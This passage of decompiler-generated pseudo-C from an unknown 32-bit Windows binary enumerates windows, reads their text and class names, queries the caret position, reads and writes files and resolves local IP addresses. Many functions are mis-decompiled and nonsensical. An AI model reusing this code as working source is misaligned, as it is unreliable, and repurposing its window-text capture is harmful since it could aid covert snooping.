        return (int32_t)v13;
    }
    // 0x406814
    function_4067a3();
    return (int32_t)LoadLibraryA((char *)function_40374f());
}

// Address range: 0x4068f8 - 0x406b6d
int32_t function_4068f8(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a1;
    int32_t v2 = a4;
    int32_t v3; // 0x4068f8
    unsigned char v4 = (char)v3;
    *(char *)v3 = 2 * v4;
    char * v5 = (char *)(v3 + 114); // 0x4068fa
    uint32_t v6; // 0x4068f8
    char v7 = v6 / 256; // 0x4068fa
    *v5 = *v5 + v7;
    unsigned char v8 = v4 - 32; // 0x4068fd
    if (v4 < 32 || v8 == 0) {
        char * v9 = (char *)((v3 & -256 | (int32_t)v8) + 105); // 0x406901
        *v9 = *v9 & v7;
        int32_t result = v1; // 0x406904
        int16_t v10 = a3; // 0x406905
        __asm_outsb(v10, *(char *)a6);
        char * v11 = (char *)(a5 + 105 & 0xffff); // 0x406906
        char v12 = a2 / 256; // 0x406906
        *v11 = *v11 & v12;
        char * v13 = (char *)(a2 + 115 + 2 * a5); // 0x40690a
        char v14 = *v13 + (char)a2; // 0x40690a
        *v13 = v14;
        if (v14 == 0) {
            // 0x406952
            int32_t v15; // bp+32, 0x4068f8
            *(int32_t *)((int32_t)&v15 - 4) = 0x40695f;
            return result;
        }
        // 0x406910
        __asm_outsd(v10, *(int32_t *)a6);
        if (v14 < 0) {
            // 0x406987
            return result;
        }
        unsigned char v16 = (char)result; // 0x406915
        unsigned char v17 = v16 - 32; // 0x406915
        int32_t v18 = result & -256 | (int32_t)v17; // 0x406915
        if (v16 >= 32 && v17 != 0) {
            char * v19 = (char *)v18; // 0x406988
            *v19 = *v19 + v17;
            *(int32_t *)v18 = a3;
            int32_t result2 = v18 + 1; // 0x40698c
            char * v20 = (char *)(2 * result2); // 0x40698d
            char v21 = result2; // 0x40698d
            *v20 = *v20 + v21;
            char * v22 = (char *)result2; // 0x406990
            *v22 = *v22 + v21;
            return result2;
        }
        char * v23 = (char *)(a2 + 105); // 0x406919
        *v23 = *v23 & (char)(result / 256);
        char * v24 = (char *)(a6 + 105); // 0x40691c
        *v24 = *v24 & v12;
        char * v25 = (char *)v18; // 0x40691f
        *v25 = *v25 + 2 * v17;
        int32_t * v26 = (int32_t *)a2; // 0x406923
        *v26 = *v26 + a6;
        *v25 = *v25 + v17;
        v1 = a5;
        v2 = __readfsdword(0);
        __writefsdword(0, (int32_t)&v2);
        int32_t v27 = g108 + 1; // 0x406938
        g108 = v27;
        if (v27 == 0) {
            // 0x406940
            function_4033f7();
        }
        // 0x40694a
        __writefsdword(0, v2);
        // 0x406952
        *(int32_t *)((int32_t)&v1 - 4) = 0x40695f;
        return 0;
    }
    // 0x406970
    int32_t v28; // 0x4068f8
    int32_t v29; // 0x4068f8
    int32_t * v30 = (int32_t *)(v28 + 105 + 2 * v29); // 0x406970
    int32_t v31; // 0x4068f8
    *v30 = *v30 | v31;
    function_40359b();
    char * lpFileName = (char *)function_40374f(); // 0x406a0c
    char * v32 = lpFileName; // bp-8, 0x406a0c
    int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g118, (int32_t)&g118, (struct _SECURITY_ATTRIBUTES *)&g118, (int32_t)&g118, (int32_t)&g118, &g118); // 0x406a0d
    int32_t v33 = (int32_t)&v32; // 0x406a17
    if (fileHandle != (int32_t *)-1) {
        int32_t v34 = (int32_t)fileHandle; // 0x406a0d
        int32_t v35 = v34; // bp-16, 0x406a1f
        int32_t v36 = GetFileSize(NULL, fileHandle); // 0x406a20
        int32_t * v37 = (int32_t *)v6; // 0x406a25
        *v37 = v36;
        v33 = &v35;
        if (v6 >= 1) {
            // 0x406a39
            function_4038db();
            int32_t hFile = function_4037a7(); // 0x406a4c
            ReadFile((int32_t *)hFile, fileHandle, (int32_t)&g118, &g118, (struct _OVERLAPPED *)&g118);
            int32_t v38 = v34; // bp-40, 0x406a58
            int32_t v39 = &v38; // 0x406a58
            CloseHandle(fileHandle);
            function_40475b();
            int32_t v40; // 0x4068f8
            int32_t * v41 = (int32_t *)(v40 - 12); // 0x406b41
            int32_t v42 = v39; // 0x406b45
            if (*v41 != 0) {
                int32_t v43 = v40 - 20;
                int32_t v44 = v40 - 24;
                *v37 = function_403893();
                *(int32_t *)(v39 - 4) = v40 - 16;
                function_4037af(&g118);
                function_4037ef();
                *v37 = function_403893();
                *(int32_t *)(v39 - 8) = v43;
                function_4037af(&g118);
                int32_t v45 = v39 - 12; // 0x406ad6
                *(int32_t *)v45 = v44;
                function_40354f();
                function_4037af(&g118);
                if (*(int32_t *)v43 != 0) {
                    // 0x406af4
                    if (*(int32_t *)v44 != 0) {
                        // 0x406afa
                        *(int32_t *)(v39 - 16) = function_403d0f() + 1;
                        function_403ecb();
                        function_403d17();
                        function_40344b();
                        function_403d17();
                        function_40344b();
                    }
                }
                // 0x406b41
                v42 = v45;
                while (*v41 != 0) {
                    int32_t v46 = v45;
                    *v37 = function_403893();
                    *(int32_t *)(v46 - 4) = v40 - 16;
                    function_4037af(&g118);
                    function_4037ef();
                    *v37 = function_403893();
                    *(int32_t *)(v46 - 8) = v43;
                    function_4037af(&g118);
                    v45 = v46 - 12;
                    *(int32_t *)v45 = v44;
                    function_40354f();
                    function_4037af(&g118);
                    if (*(int32_t *)v43 != 0) {
                        // 0x406af4
                        if (*(int32_t *)v44 != 0) {
                            // 0x406afa
                            *(int32_t *)(v46 - 16) = function_403d0f() + 1;
                            function_403ecb();
                            function_403d17();
                            function_40344b();
                            function_403d17();
                            function_40344b();
                        }
                    }
                    // 0x406b41
                    v42 = v45;
                }
            }
            // 0x406b4b
            *(int32_t *)(v40 - 4) = -1;
            v33 = v42;
        }
    }
    // 0x406b52
    __writefsdword(0, *(int32_t *)v33);
    *(int32_t *)(v33 + 8) = 0x406b74;
    return function_40341b();
}

// Address range: 0x406b6d - 0x406b72
int32_t function_406b6d(void) {
    // 0x406b6d
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406b72 - 0x406b74
int32_t function_406b72(void) {
    // 0x406b72
    int32_t result; // 0x406b72
    return result;
}

// Address range: 0x406b74 - 0x406b7e
int32_t function_406b74(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406b74
    int32_t v1; // 0x406b74
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x406bab - 0x406caf
int32_t function_406bab(void) {
    int32_t v1 = 0; // bp-8, 0x406bae
    int32_t v2 = __readfsdword(0); // bp-40, 0x406bbf
    int32_t v3 = &v2; // 0x406bbf
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x406bd3
    if (function_403d0f() >= 1) {
        // 0x406bd9
        function_40359b();
        char * lpFileName = (char *)function_40374f(); // 0x406c08
        char * v5 = lpFileName; // bp-68, 0x406c08
        int32_t v6 = (int32_t)&v5; // 0x406c08
        int32_t * fileHandle = CreateFileA(lpFileName, (int32_t)&g118, (int32_t)&g118, (struct _SECURITY_ATTRIBUTES *)&g118, (int32_t)&g118, (int32_t)&g118, &g118); // 0x406c09
        v4 = v6;
        if (fileHandle != (int32_t *)-1) {
            // 0x406c15
            function_4033f7();
            uint32_t v7 = function_403d17(); // 0x406c22
            int32_t v8 = v6; // 0x406c2b
            if (v7 >= 0) {
                int32_t v9 = 0; // 0x406c2e
                int32_t v10 = v6; // 0x406c2e
                int32_t v11 = v7 + 1; // 0x406c2e
                *(int32_t *)(v10 - 4) = 0;
                int32_t v12 = 8 * v9; // 0x406c38
                *(int32_t *)(v10 - 8) = *(int32_t *)(g110 + v12);
                *(int32_t *)(v10 - 12) = (int32_t)&g6;
                *(int32_t *)(v10 - 16) = *(int32_t *)(g110 + (v12 | 4));
                v10 -= 20;
                *(int32_t *)v10 = (int32_t)"\r\n";
                function_40360f((int32_t)&g118);
                v11--;
                v9++;
                v8 = v10;
                while (v11 != 0) {
                    // 0x406c30
                    *(int32_t *)(v10 - 4) = 0;
                    v12 = 8 * v9;
                    *(int32_t *)(v10 - 8) = *(int32_t *)(g110 + v12);
                    *(int32_t *)(v10 - 12) = (int32_t)&g6;
                    *(int32_t *)(v10 - 16) = *(int32_t *)(g110 + (v12 | 4));
                    v10 -= 20;
                    *(int32_t *)v10 = (int32_t)"\r\n";
                    function_40360f((int32_t)&g118);
                    v11--;
                    v9++;
                    v8 = v10;
                }
            }
            int32_t v13 = (int32_t)fileHandle; // 0x406c09
            function_40475b();
            *(int32_t *)(v8 - 4) = 0;
            *(int32_t *)(v8 - 8) = (int32_t)&v1;
            *(int32_t *)(v8 - 12) = function_40354f();
            *(int32_t *)(v8 - 16) = function_4037a7();
            *(int32_t *)(v8 - 20) = v13;
            WriteFile(&g118, &g118, (int32_t)&g118, &g118, (struct _OVERLAPPED *)&g118);
            *(int32_t *)(v8 - 24) = v13;
            SetEndOfFile(&g118);
            int32_t v14 = v8 - 28; // 0x406c8b
            *(int32_t *)v14 = v13;
            CloseHandle(&g118);
            v4 = v14;
        }
    }
    // 0x406c94
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x406cb6;
    return function_40341b();
}

// Address range: 0x406caf - 0x406cb4
int32_t function_406caf(void) {
    // 0x406caf
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406cb4 - 0x406cb6
int32_t function_406cb4(void) {
    // 0x406cb4
    int32_t result; // 0x406cb4
    return result;
}

// Address range: 0x406cb6 - 0x406cbf
int32_t function_406cb6(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406cb6
    int32_t result; // 0x406cb6
    return result;
}

// Address range: 0x406ceb - 0x406dda
int32_t function_406ceb(void) {
    // 0x406ceb
    function_40373f();
    function_40373f();
    int32_t v1 = __readfsdword(0); // bp-40, 0x406d17
    __writefsdword(0, (int32_t)&v1);
    if (function_403d17() < 0) {
        // 0x406d73
        function_403d0f();
        function_403ecb();
        function_403d17();
        function_40344b();
        function_403d17();
        function_40344b();
        function_406bab();
    } else {
        // 0x406d41
        function_40369b();
        function_40369b();
    }
    // 0x406dbf
    __writefsdword(0, v1);
    return function_40341b();
}

// Address range: 0x406dda - 0x406ddf
int32_t function_406dda(void) {
    // 0x406dda
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406ddf - 0x406de1
int32_t function_406ddf(void) {
    // 0x406ddf
    int32_t result; // 0x406ddf
    return result;
}

// Address range: 0x406de1 - 0x406deb
int32_t function_406de1(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406de1
    int32_t v1; // 0x406de1
    return *(int32_t *)(v1 - 12);
}

// Address range: 0x406deb - 0x406e31
int32_t function_406deb(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406df6
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g109 + 1; // 0x406dfc
    g109 = v2;
    if (v2 != 0) {
        // 0x406e23
        __writefsdword(0, v1);
        return 0;
    }
    // 0x406e04
    if (g33 != 0) {
        // 0x406e0e
        function_406bab();
    }
    // 0x406e13
    function_403ed7();
    // 0x406e23
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406e31 - 0x406e36
int32_t function_406e31(void) {
    // 0x406e31
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406e36 - 0x406e38
int32_t function_406e36(void) {
    // 0x406e36
    int32_t result; // 0x406e36
    return result;
}

// Address range: 0x406e38 - 0x406e3a
int32_t function_406e38(int32_t a1) {
    // 0x406e38
    int32_t result; // 0x406e38
    return result;
}

// Address range: 0x406e3b - 0x406e7d
int32_t function_406e3b(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406e46
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g109; // 0x406e4c
    g109 = v2 - 1;
    if (v2 == 0) {
        // 0x406e55
        function_403ecb();
    }
    // 0x406e6f
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x406e7d - 0x406e82
int32_t function_406e7d(void) {
    // 0x406e7d
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406e82 - 0x406e84
int32_t function_406e82(void) {
    // 0x406e82
    int32_t result; // 0x406e82
    return result;
}

// Address range: 0x406e84 - 0x406e86
int32_t function_406e84(int32_t a1) {
    // 0x406e84
    int32_t result; // 0x406e84
    return result;
}

// Address range: 0x406e87 - 0x406e8d
bool function_406e87(char * pszPath) {
    // 0x406e87
    return PathFileExistsA(pszPath);
}

// Address range: 0x406e8f - 0x406ecd
int32_t function_406e8f(void) {
    int32_t v1 = 260; // bp-276, 0x406e99
    int32_t nBufferLength; // 0x406e8f
    int32_t pathSize = GetTempPathA(nBufferLength, (char *)&g118); // 0x406e9e
    if (pathSize == 0) {
        // 0x406ec5
        return 0;
    }
    int32_t v2 = &v1; // 0x406e99
    int32_t v3 = pathSize + v2;
    if (*(char *)(v3 - 1) != 92) {
        // 0x406eae
        *(char *)v3 = 92;
        *(char *)(pathSize + (v2 | 1)) = 0;
    }
    // 0x406ec5
    return function_403537();
}

// Address range: 0x406ecf - 0x406fa1
int32_t function_406ecf(int32_t a1, int32_t nIndex) {
    int32_t hWnd2 = 0; // bp-8, 0x406ed2
    int32_t v1 = __readfsdword(0); // bp-40, 0x406ee9
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = nIndex; // bp-44, 0x406ef2
    int32_t * hWnd = (int32_t *)nIndex; // 0x406ef3
    bool isVisible = IsWindowVisible(hWnd); // 0x406ef3
    int32_t v3 = &v2; // 0x406f00
    if (isVisible) {
        int32_t v4 = nIndex; // bp-52, 0x406f08
        int32_t v5 = GetClassLongA((int32_t *)-32, nIndex); // 0x406f09
        v3 = &v4;
        if (v5 == 0x8002) {
            int32_t v6 = nIndex; // bp-56, 0x406f15
            int32_t * v7 = GetParent(hWnd); // 0x406f16
            v3 = &v6;
            if (*(int32_t *)(a1 + 4) == (int32_t)v7) {
                int32_t v8 = nIndex; // bp-64, 0x406f24
                int32_t v9 = &v8; // 0x406f24
                GetWindowThreadProcessId(&hWnd2, hWnd);
                v3 = v9;
                if (*(int32_t *)a1 == hWnd2) {
                    // 0x406f31
                    if (*(int32_t *)(a1 + 8) == 0) {
                        int32_t hWndParent = *(int32_t *)(a1 + 12); // 0x406f5b
                        int32_t hWndChildAfter = *(int32_t *)(a1 + 16); // 0x406f5f
                        int32_t * hWnd3 = FindWindowExA((int32_t *)hWndParent, (int32_t *)hWndChildAfter, NULL, (char *)nIndex); // 0x406f66
                        int32_t v10 = (int32_t)hWnd3; // 0x406f66
                        *(int32_t *)(a1 + 24) = v10;
                        int32_t v11 = v10; // bp-84, 0x406f71
                        int32_t v12 = &v11; // 0x406f71
                        v3 = v12;
                        if (IsWindow(hWnd3)) {
                            // 0x406f81
                            *(int32_t *)(a1 + 20) = nIndex;
                            v3 = v12;
                        }
                    } else {
                        // 0x406f37
                        function_4070a7();
                        function_4034fb();
                        function_40369b();
                        v3 = v9;
                    }
                }
            }
        }
    }
    // 0x406f86
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x406fa8;
    return function_40341b();
}

// Address range: 0x406fa1 - 0x406fa6
int32_t function_406fa1(void) {
    // 0x406fa1
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406fa6 - 0x406fa8
int32_t function_406fa6(void) {
    // 0x406fa6
    int32_t result; // 0x406fa6
    return result;
}

// Address range: 0x406fa8 - 0x406fb3
int32_t function_406fa8(int32_t a1, int32_t a2, int32_t a3) {
    // 0x406fa8
    int32_t result; // 0x406fa8
    return result;
}

// Address range: 0x406fb3 - 0x407038
int32_t function_406fb3(int32_t a1, uint32_t a2, int32_t a3) {
    // 0x406fb3
    int32_t hWnd; // 0x406fb3
    int32_t lpdwProcessId; // 0x406fb3
    GetWindowThreadProcessId((int32_t *)hWnd, (int32_t *)lpdwProcessId);
    int32_t v1 = GetTickCount(); // 0x406ff0
    int32_t v2; // bp-60, 0x406fb3
    int32_t v3 = &v2; // 0x406ff5
    int32_t v4; // bp-40, 0x406fb3
    *(int32_t *)(v3 - 4) = (int32_t)&v4;
    *(int32_t *)(v3 - 8) = 0x406ecf;
    EnumWindows((bool (*)(int32_t *, int32_t))&g118, (int32_t)&g118);
    *(int32_t *)(v3 - 12) = 1;
    Sleep((int32_t)&g118);
    v3 -= 16;
    *(int32_t *)v3 = 0;
    while (!IsWindow(&g118)) {
        // 0x407016
        if (GetTickCount() - v1 > a2) {
            // break -> 0x407021
            break;
        }
        *(int32_t *)(v3 - 4) = (int32_t)&v4;
        *(int32_t *)(v3 - 8) = 0x406ecf;
        EnumWindows((bool (*)(int32_t *, int32_t))&g118, (int32_t)&g118);
        *(int32_t *)(v3 - 12) = 1;
        Sleep((int32_t)&g118);
        v3 -= 16;
        *(int32_t *)v3 = 0;
    }
    // 0x407021
    return 0;
}

// Address range: 0x40703b - 0x407052
int32_t function_40703b(void) {
    // 0x40703b
    int32_t v1; // 0x40703b
    return (unsigned char)((char)v1 - 33) < 94;
}

// Address range: 0x407053 - 0x40706a
int32_t function_407053(int32_t a1) {
    int32_t v1 = -1; // 0x40705e
    int32_t v2 = 0; // 0x40705e
    while (v1 != 0) {
        int32_t v3; // 0x407053
        int32_t v4 = v3;
        v1--;
        bool v5; // 0x407053
        v3 = v4 + (v5 ? -1 : 1);
        v2 = v1;
        if (*(char *)v4 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    return -2 - v2;
}

// Address range: 0x40706b - 0x40707d
int32_t function_40706b(void) {
    // 0x40706b
    return function_4034fb();
}

// Address range: 0x40707f - 0x4070a7
int32_t function_40707f(void) {
    int32_t v1 = -1; // 0x40708c
    int32_t v2 = 0; // 0x40708c
    bool v3; // 0x40707f
    while (v1 != 0) {
        int32_t v4; // 0x40707f
        int32_t v5 = v4;
        v1--;
        v4 = v5 + (v3 ? -1 : 1);
        v2 = v1;
        if (*(char *)v5 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    uint32_t v6 = v2 ^ -1; // 0x40708e
    uint32_t v7 = v6 / 4; // 0x407098
    int32_t v8; // 0x40707f
    int32_t result; // 0x40707f
    __asm_rep_movsd_memcpy((char *)result, (char *)v8, v7);
    char * v9 = (char *)(v7 * (v3 ? -4 : 4) + result); // 0x4070a2
    __asm_rep_movsb_memcpy(v9, v9, v6 & 3);
    return result;
}

// Address range: 0x4070a7 - 0x4070da
int32_t function_4070a7(void) {
    // 0x4070a7
    int32_t hWnd; // 0x4070a7
    int32_t v1 = SendMessageA((int32_t *)hWnd, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x4070bb
    int32_t v2; // bp-284, 0x4070a7
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_403537();
}

// Address range: 0x4070db - 0x407112
int32_t function_4070db(void) {
    // 0x4070db
    int32_t lpClassName; // 0x4070db
    int32_t hWnd; // 0x4070db
    int32_t v1 = GetClassNameA((int32_t *)hWnd, (char *)lpClassName, (int32_t)&g118); // 0x4070f2
    int32_t v2; // bp-284, 0x4070db
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_403537();
}

// Address range: 0x407113 - 0x407152
int32_t function_407113(void) {
    // 0x407113
    function_40354f();
    function_40354f();
    return function_4037af(&g118);
}

// Address range: 0x407153 - 0x40718b
int32_t function_407153(void) {
    // 0x407153
    function_40354f();
    int32_t v1; // 0x407153
    return function_4037af((int32_t *)v1);
}

// Address range: 0x40718b - 0x4071ba
int32_t function_40718b(void) {
    // 0x40718b
    function_40374f();
    int32_t Locale = function_40374f(); // 0x40719f
    int32_t v1 = CompareStringA(Locale, 1, (char *)1024, (int32_t)&g118, (char *)&g118, (int32_t)&g118); // 0x4071ac
    return v1 & -256 | (int32_t)(v1 == 2);
}

// Address range: 0x4071bb - 0x407235
int32_t function_4071bb(void) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x4071cd
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-36, 0x4071bb
    int32_t v3 = &v2; // 0x4071d5
    int32_t hWnd; // 0x4071bb
    int32_t v4 = (int32_t)GetTopWindow((int32_t *)hWnd);
    int32_t * v5 = (int32_t *)(v3 - 4); // 0x407215
    *v5 = v4;
    bool v6 = IsWindow(&g118); // 0x407216
    int32_t v7 = v3; // 0x40721d
    int32_t * v8 = v5; // 0x40721d
    if (v6) {
        function_4070a7();
        function_4071bb();
        *(int32_t *)(v3 - 8) = 2;
        int32_t v9 = v3 - 12; // 0x40720d
        *(int32_t *)v9 = v4;
        int32_t v10 = (int32_t)GetWindow(&g118, (int32_t)&g118);
        int32_t * v11 = (int32_t *)(v3 - 16);
        *v11 = v10;
        bool v12 = IsWindow(&g118); // 0x407216
        v7 = v9;
        v8 = v11;
        while (v12) {
            int32_t v13 = v9;
            function_4070a7();
            function_4071bb();
            *(int32_t *)(v13 - 8) = 2;
            v9 = v13 - 12;
            *(int32_t *)v9 = v10;
            v10 = (int32_t)GetWindow(&g118, (int32_t)&g118);
            v11 = (int32_t *)(v13 - 16);
            *v11 = v10;
            v12 = IsWindow(&g118);
            v7 = v9;
            v8 = v11;
        }
    }
    // 0x40721f
    __writefsdword(0, *v8);
    *(int32_t *)(v7 + 4) = 0x40723c;
    return function_4033f7();
}

// Address range: 0x407235 - 0x40723a
int32_t function_407235(void) {
    // 0x407235
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40723a - 0x40723c
int32_t function_40723a(void) {
    // 0x40723a
    int32_t result; // 0x40723a
    return result;
}

// Address range: 0x40723c - 0x407244
int32_t function_40723c(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40723c
    int32_t result; // 0x40723c
    return result;
}

// Address range: 0x407247 - 0x4072a8
int32_t function_407247(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x407258
    __writefsdword(0, (int32_t)&v1);
    function_4070db();
    function_40369b();
    function_4071bb();
    __writefsdword(0, v1);
    return function_4033f7();
}

// Address range: 0x4072a8 - 0x4072ad
int32_t function_4072a8(void) {
    // 0x4072a8
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4072ad - 0x4072af
int32_t function_4072ad(void) {
    // 0x4072ad
    int32_t result; // 0x4072ad
    return result;
}

// Address range: 0x4072af - 0x4072b6
int32_t function_4072af(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4072af
    int32_t result; // 0x4072af
    return result;
}

// Address range: 0x4072ca - 0x4072d2
int32_t function_4072ca(void) {
    // 0x4072ca
    int32_t v1; // 0x4072ca
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x4072ca
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3; // 0x4072ca
    char * v4 = (char *)(v3 + 81); // 0x4072ce
    int32_t v5; // 0x4072ca
    *v4 = *v4 + (char)v5;
    return result;
}

// Address range: 0x4072d2 - 0x4072d6
float80_t function_4072d2(void) {
    // 0x4072d2
    float80_t v1; // 0x4072d2
    return 2 * v1;
}

// Address range: 0x4072d7 - 0x407356
int32_t function_4072d7(void) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x4072e7
    __writefsdword(0, (int32_t)&v1);
    function_4070db();
    function_40369b();
    int32_t nIndex; // 0x4072d7
    int32_t v2 = GetWindowLongA((int32_t *)-12, nIndex); // 0x407309
    int32_t v3; // bp-32, 0x4072d7
    int32_t * v4 = &v3; // 0x407313
    if (v2 != 180) {
        int32_t v5 = GetWindowLongA((int32_t *)-16, nIndex); // 0x407318
        int32_t v6; // bp-40, 0x4072d7
        v4 = &v6;
        if ((v5 & 32) == 0) {
            // 0x407321
            SendMessageA(NULL, 0, 210, nIndex);
            int32_t v7; // bp-56, 0x4072d7
            v4 = &v7;
        }
    }
    // 0x40733a
    __writefsdword(0, *v4);
    *(int32_t *)((int32_t)v4 + 8) = 0x40735d;
    return function_4033f7();
}

// Address range: 0x407356 - 0x40735b
int32_t function_407356(void) {
    // 0x407356
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40735b - 0x40735d
int32_t function_40735b(void) {
    // 0x40735b
    int32_t result; // 0x40735b
    return result;
}

// Address range: 0x40735d - 0x407363
int32_t function_40735d(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40735d
    int32_t result; // 0x40735d
    return result;
}

// Address range: 0x407373 - 0x4073cd
int32_t function_407373(void) {
    // 0x407373
    int32_t hWnd; // 0x407373
    int32_t * h = GetDC((int32_t *)hWnd); // 0x40737b
    int32_t lParam; // 0x407373
    SelectObject((int32_t *)SendMessageA(NULL, 0, 49, lParam), h);
    int32_t hdc; // bp-40, 0x407373
    GetCharWidthA(&hdc, 42, 42, h);
    SelectObject(GetStockObject(10), h);
    ReleaseDC(h, (int32_t *)lParam);
    int32_t lpPoint; // bp-84, 0x407373
    GetCaretPos((struct tagPOINT *)&lpPoint);
    int32_t v1 = &lpPoint; // 0x4073bf
    return (0x100000000 * (int64_t)(v1 >> 31) | (int64_t)v1) / (int64_t)(int32_t)h;
}

// Address range: 0x4073cf - 0x4074dc
int32_t function_4073cf(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x4073e3
    int32_t v2 = &v1; // 0x4073e3
    __writefsdword(0, v2);
    if (g38 != 0) {
        // 0x4073f8
        *(int32_t *)g38 = 0;
    }
    // 0x40740b
    int32_t v3; // 0x4073cf
    int32_t v4; // 0x4073cf
    if (g35 == 0) {
        // 0x40741f
        function_407503();
        v4 = v2;
        goto lab_0x4074c6;
    } else {
        // 0x407415
        if (g36 != 0) {
            // 0x407429
            v3 = g36;
            if (*(char *)&g39 == 0) {
                goto lab_0x407452;
            } else {
                // 0x407433
                if (function_406ceb() == 0) {
                    // 0x407433
                    v3 = g36;
                    goto lab_0x407452;
                } else {
                    // 0x40744b
                    function_407503();
                    v4 = v2;
                    goto lab_0x4074c6;
                }
            }
        } else {
            // 0x40741f
            function_407503();
            v4 = v2;
            goto lab_0x4074c6;
        }
    }
  lab_0x4074c6:
    // 0x4074c6
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x4074e3;
    return function_4033f7();
  lab_0x407452:
    // 0x407452
    function_40360f(v3);
    function_40344b();
    int32_t lpThreadAttributes; // bp-12, 0x4073cf
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))2, (int32_t *)0x4063cf, 0, NULL);
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))1, (int32_t *)0x4063cf, 0, NULL);
    int32_t v5 = 0; // bp-112, 0x4074ba
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, NULL, (int32_t *)0x4063cf, 0, NULL);
    function_407503();
    v4 = &v5;
    goto lab_0x4074c6;
}

// Address range: 0x4074dc - 0x4074e1
int32_t function_4074dc(void) {
    // 0x4074dc
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4074e1 - 0x4074e3
int32_t function_4074e1(void) {
    // 0x4074e1
    int32_t result; // 0x4074e1
    return result;
}

// Address range: 0x4074e3 - 0x4074ea
int32_t function_4074e3(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4074e3
    int32_t result; // 0x4074e3
    return result;
}

// Address range: 0x407503 - 0x407518
int32_t function_407503(void) {
    // 0x407503
    function_4033f7();
    return function_4033f7();
}

// Address range: 0x40751b - 0x407584
int32_t function_40751b(void) {
    int32_t v1 = 257; // bp-488, 0x40752c
    int32_t v2; // 0x40751b
    int32_t v3; // 0x40751b
    WSAStartup((int16_t)v3, (struct WSAData *)v2);
    function_4033f7();
    int32_t namelen = &v1; // 0x407543
    int32_t name = namelen; // bp-496, 0x407543
    gethostname((char *)64, namelen);
    char * v4 = (char *)&name; // bp-500, 0x407549
    struct hostent * v5 = gethostbyname((char *)&name); // 0x40754a
    int32_t result = (int32_t)v5; // 0x40754a
    if (v5 == NULL) {
        // 0x407579
        return result;
    }
    int32_t v6 = *(int32_t *)(result + 12); // 0x407553
    int32_t v7 = *(int32_t *)v6; // 0x40756d
    if (v7 != 0) {
        int32_t v8 = 0; // 0x40756c
        int32_t v9 = (int32_t)&v4;
        int32_t v10 = v9; // 0x40755c
        if (v8 == 0) {
            // 0x40755e
            v10 = v9 - 4;
            *(int32_t *)v10 = *(int32_t *)v7;
            inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g118});
            function_40706b();
        }
        // 0x40756c
        v8++;
        int32_t v11 = *(int32_t *)(4 * v8 + v6); // 0x40756d
        while (v11 != 0) {
            // 0x40755a
            v9 = v10;
            v10 = v9;
            if (v8 == 0) {
                // 0x40755e
                v10 = v9 - 4;
                *(int32_t *)v10 = *(int32_t *)v11;
                inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g118});
                function_40706b();
            }
            // 0x40756c
            v8++;
            v11 = *(int32_t *)(4 * v8 + v6);
        }
    }
    // 0x407579
    return WSACleanup();
}

// Address range: 0x407587 - 0x4075ac
int32_t function_407587(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407592
    __writefsdword(0, (int32_t)&v1);
    g111++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4075ac - 0x4075b1
int32_t function_4075ac(void) {
    // 0x4075ac
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4075b1 - 0x4075b3
int32_t function_4075b1(void) {
    // 0x4075b1
    int32_t result; // 0x4075b1
    return result;
}

// Address range: 0x4075b3 - 0x4075b5
int32_t function_4075b3(int32_t a1) {
    // 0x4075b3
    int32_t result; // 0x4075b3
    return result;
}

// Address range: 0x4075b7 - 0x4075bf
